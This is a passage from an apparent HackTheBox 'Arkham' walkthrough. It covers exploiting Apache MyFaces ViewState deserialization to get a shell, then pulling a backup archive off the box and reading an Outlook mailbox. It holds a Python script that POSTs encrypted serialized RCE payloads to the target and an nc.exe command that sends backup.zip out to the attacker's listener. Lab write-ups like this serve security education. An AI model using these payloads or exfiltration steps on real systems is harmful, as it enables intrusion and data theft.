request.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Exception&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &amp;#39;bootstrap&amp;#39;; [Ljava.lang.Object; is in module java.base of loader &amp;#39;bootstrap&amp;#39;)</span><br><span class="line">        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getSavedState(HtmlResponseStateManager.java:187)</span><br><span class="line">        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getState(HtmlResponseStateManager.java:139)</span><br><span class="line">        org.apache.myfaces.application.jsp.JspStateManagerImpl.restoreView(JspStateManagerImpl.java:355)</span><br><span class="line">        org.apache.myfaces.application.jsp.JspViewHandlerImpl.restoreView(JspViewHandlerImpl.java:515)</span><br><span class="line">        org.apache.myfaces.lifecycle.RestoreViewExecutor.execute(RestoreViewExecutor.java:85)</span><br><span class="line">        org.apache.myfaces.lifecycle.LifecycleImpl.executePhase(LifecycleImpl.java:103)</span><br><span class="line">        org.apache.myfaces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:76)</span><br><span class="line">        javax.faces.webapp.FacesServlet.service(FacesServlet.java:244)</span><br><span class="line">        org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)</span><br><span class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;Note&lt;/b&gt; The full stack trace of the root cause is available in the server logs.&lt;/p&gt;&lt;hr class="line" /&gt;&lt;h3&gt;Apache Tomcat/8.5.37&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>Then I checked my listener, and :<br><img src="/images/hackthebox/arkham/11.png" alt=""><br>We owned user !<br>I also scripted this because copying and pasting in burp wasn’t my favorite thing and it only takes 2 minutes to script this in python :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(payload)</span>:</span></span><br><span class="line">	post_data = &#123;<span class="string">"j_id_jsp_1623871077_1:email"</span> : <span class="string">"test"</span> , <span class="string">"j_id_jsp_1623871077_1:submit"</span> : <span class="string">"SIGN UP"</span> , <span class="string">"j_id_jsp_1623871077_1_SUBMIT"</span> : <span class="string">"1"</span> , <span class="string">"javax.faces.ViewState"</span> : payload&#125;</span><br><span class="line">	requests.post(<span class="string">"http://10.10.10.130:8080/userSubscribe.faces"</span>,data=post_data)</span><br><span class="line"></span><br><span class="line">upload_payload = <span class="string">"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"</span></span><br><span class="line">execute_payload	= <span class="string">"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"</span></span><br><span class="line"></span><br><span class="line">exploit(upload_payload)</span><br><span class="line">exploit(execute_payload)</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/arkham/12.png" alt=""></p>
<h2 id="Shell-as-Batman"><a href="#Shell-as-Batman" class="headerlink" title="Shell as Batman"></a>Shell as Batman</h2><p>We are on the box as <code>Alfred</code>, I enumerated the directories and found a directory called <code>backups</code> in <code>C:\Users\Alfred\Downloads</code>, It had a <code>zip</code> archive called <code>backup.zip</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Alfred\Downloads&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is FA90-3873</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Alfred\Downloads</span><br><span class="line"></span><br><span class="line">02&#x2F;03&#x2F;2019  08:48 AM    &lt;DIR&gt;          .</span><br><span class="line">02&#x2F;03&#x2F;2019  08:48 AM    &lt;DIR&gt;          ..</span><br><span class="line">02&#x2F;03&#x2F;2019  08:41 AM    &lt;DIR&gt;          backups</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               3 Dir(s)   8,675,921,920 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Alfred\Downloads&gt;cd backups</span><br><span class="line">cd backups</span><br><span class="line"></span><br><span class="line">C:\Users\Alfred\Downloads\backups&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is FA90-3873</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Alfred\Downloads\backups</span><br><span class="line"></span><br><span class="line">02&#x2F;03&#x2F;2019  08:41 AM    &lt;DIR&gt;          .</span><br><span class="line">02&#x2F;03&#x2F;2019  08:41 AM    &lt;DIR&gt;          ..</span><br><span class="line">02&#x2F;03&#x2F;2019  08:41 AM           124,257 backup.zip</span><br><span class="line">               1 File(s)        124,257 bytes</span><br><span class="line">               2 Dir(s)   8,675,921,920 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Alfred\Downloads\backups&gt;</span><br></pre></td></tr></table></figure>
<p>I wanted to get it on my box so I used <code>nc</code> to do it. I listened on port 1338, then on the box I did this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Alfred\Downloads\backups&gt;C:\windows\system32\spool\drivers\color\nc.exe -w 3 10.10.xx.xx 1338 &lt; C:\Users\Alfred\Downloads\backups\backup.zip                                                             </span><br><span class="line">C:\windows\system32\spool\drivers\color\nc.exe -w 3 10.10.xx.xx 1338 &lt; C:\Users\Alfred\Downloads\backups\backup.zip                                                                                   </span><br><span class="line">C:\Users\Alfred\Downloads\backups&gt;</span><br></pre></td></tr></table></figure>
<p>And I successfully got the file :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;backups# nc -lp 1338 &gt; backup.zip                                                                    </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;backups# ls -la</span><br><span class="line">total 132</span><br><span class="line">drwxr-xr-x 2 root root   4096 Aug  9 21:26 .</span><br><span class="line">drwxr-xr-x 5 root root   4096 Aug  9 21:24 ..</span><br><span class="line">-rw-r--r-- 1 root root 124257 Aug  9 21:26 backup.zip</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;backups#</span><br></pre></td></tr></table></figure>
<p>The archive only had a file called <code>alfred@arkham.local.ost</code> which is an outlook email folder so I used <code>readpst</code> to convert it.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;backups# unzip backup.zip </span><br><span class="line">Archive:  backup.zip</span><br><span class="line">  inflating: alfred@arkham.local.ost  </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;backups# file alfred@arkham.local.ost </span><br><span class="line">alfred@arkham.local.ost: Microsoft Outlook email folder</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;backups# readpst alfred@arkham.local.ost </span><br><span class="line">Opening PST file and indexes...</span><br><span class="line">Processing Folder &quot;Deleted Items&quot;</span><br><span class="line">Processing Folder &quot;Inbox&quot;</span><br><span class="line">Processing Folder &quot;Outbox&quot;</span><br><span class="line">Processing Folder &quot;Sent Items&quot;</span><br><span class="line">Processing Folder &quot;Calendar&quot;</span><br><span class="line">Processing Folder &quot;Contacts&quot;</span><br><span class="line">Processing Folder &quot;Conversation Action Settings&quot;</span><br><span class="line">Processing Folder &quot;Drafts&quot;</span><br><span class="line">Processing Folder &quot;Journal&quot;</span><br><span class="line">Processing Folder &quot;Junk E-Mail&quot;</span><br><span class="line">Processing Folder &quot;Notes&quot;</span><br><span class="line">Processing Folder &quot;Tasks&quot;</span><br><span class="line">Processing Folder &quot;Sync Issues&quot;</span><br><span class="line">Processing Folder &quot;RSS Feeds&quot;</span><br><span class="line">Processing Folder &quot;Quick Step Settings&quot;</span><br><span class="line">  &quot;alfred@arkham.local.ost&quot; - 15 items done, 0 items skipped.</span><br><span class="line">  &quot;Calendar&quot; - 0 items done, 3 items skipped.</span><br><span class="line">Processing Folder &quot;Conflicts&quot;</span><br><span class="line">Processing Folder &quot;Local Failures&quot;</span><br><span class="line">Processing Folder &quot;Server Failures&quot;</span><br><span class="line">  &quot;Sync Issues&quot; - 3 items done, 0 items skipped.</span><br><span class="line">  &quot;Inbox&quot; - 0 items done, 7 items skipped.</span><br><span class="line">  &quot;Drafts&quot; - 1 items done, 0 items skipped.</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;backups#</span><br></pre></td></tr></table></figure>
<p>The output was saved in <code>Drafts.mbox</code>, I removed the long useless output :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;backups# ls -la</span><br><span class="line">total 16608</span><br><span class="line">drwxr-xr-x 2 root root     4096 Aug  9 21:33 .</span><br><span class="line">drwxr-xr-x 5 root root     4096 Aug  9 21:33 ..</span><br><span class="line">-rwx------ 1 root root 16818176 Feb  3  2019 alfred@arkham.local.ost</span><br><span class="line">-rw-r--r-- 1 root root   124257 Aug  9 21:26 backup.zip</span><br><span class="line">-rw-r--r-- 1 root root    51857 Aug  9 21:33 Drafts.mbox</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;backups# cat Drafts.mbox </span><br><span class="line">   ----------------</span><br><span class="line">    Removed Output</span><br><span class="line">   ----------------</span><br><span class="line">&lt;&#x2F;o:shapelayout&gt;&lt;&#x2F;xml&gt;&lt;![endif]--&gt;&lt;&#x2F;head&gt;&lt;body lang&#x3D;EN-US link&#x3D;&quot;#0563C1&quot; vlink&#x3D;&quot;#954F72&quot; style&#x3D;&#39;tab-interval:.5in&#39;&gt;&lt;div class&#x3D;WordSection1&gt;&lt;p class&#x3D;MsoNormal&gt;Master Wayne stop forgetting your password&lt;o:p&gt;&lt;&#x2F;o:p&gt;&lt;&#x2F;p&gt;&lt;p class&#x3D;MsoNormal&gt;&lt;o:p&gt;&amp;nbsp;&lt;&#x2F;o:p&gt;&lt;&#x2F;p&gt;&lt;p class&#x3D;MsoNormal&gt;&lt;span style&#x3D;&#39;mso-no-proof:yes&#39;&gt;&lt;img width&#x3D;677 height&#x3D;343 id&#x3D;&quot;Picture_x0020_1&quot; src&#x3D;&quot;cid:image001.png@01D4BB4A.F5061EA0&quot;&gt;&lt;&#x2F;span&gt;&lt;o:p&gt;&lt;&#x2F;o:p&gt;&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br><span class="line">----boundary-LibPST-iamunique-672158152_-_-</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line">Content-Transfer-Encoding: base64</span><br><span class="line">Content-ID: &lt;image001.png@01D4BB4A.F5061EA0&gt;</span><br><span class="line">Content-Disposition: attachment; </span><br><span class="line">        filename*&#x3D;utf-8&#39;&#39;image001.png;</span><br><span class="line">        filename&#x3D;&quot;image001.png&quot;</span><br><span class="line"></span><br><span class="line">iVBORw0KGgoAAAANSUhEUgAAAqUAAAFXCAIAAAAUCKDqAAAAAXNSR0IArs4c6QAAJwVJREFUeF7t</span><br><span class="line">3V+oZdd5GPCjUmibujISRUNh5GhiCya2hI0lVXSoEwXXCRMoqpUXyzR6MFaUIlwh2S9+kB+sB7&#x2F;Y</span><br><span class="line">ElNjWskmDzJ0&#x2F;FKpItCBGDGSBROGKMYgoaqM3XEsQZBpLazUTelLu8&#x2F;Z9+677&#x2F;679jn7O3edO7&#x2F;L</span><br><span class="line">IEbn7v2tb&#x2F;2+dfa3&#x2F;5w797qPfuyOhS8CBAgQIEDgWAtcV&#x2F;T7u7994VjP0eQIECBAYIcF&#x2F;vKPz97x</span><br><span class="line">H2buU&#x2F;PG&#x2F;N+P&#x2F;MuHbvknORA&#x2F;&#x2F;dO&#x2F;&#x2F;rVzf9rO5PKDZ&#x2F;9ODvnJgQABAgQIEAgV0O9DeQUnQIAAAQJZ</span><br><span class="line">COj3WZRBEgQIECBAIFRAvw&#x2F;lFZwAAQIECGQhoN9nUQZJECBAgACBUAH9PpRXcAIECBDYMYFn7rpp</span><br><span class="line">4M+8k&#x2F;nEf&#x2F;zP5Z8qbPuVuUbU7+eSFIcAAQIECEwTeOWz&#x2F;6rcoWz5VeOvXp8WbnBr&#x2F;X5GTKEIECBA</span><br><span 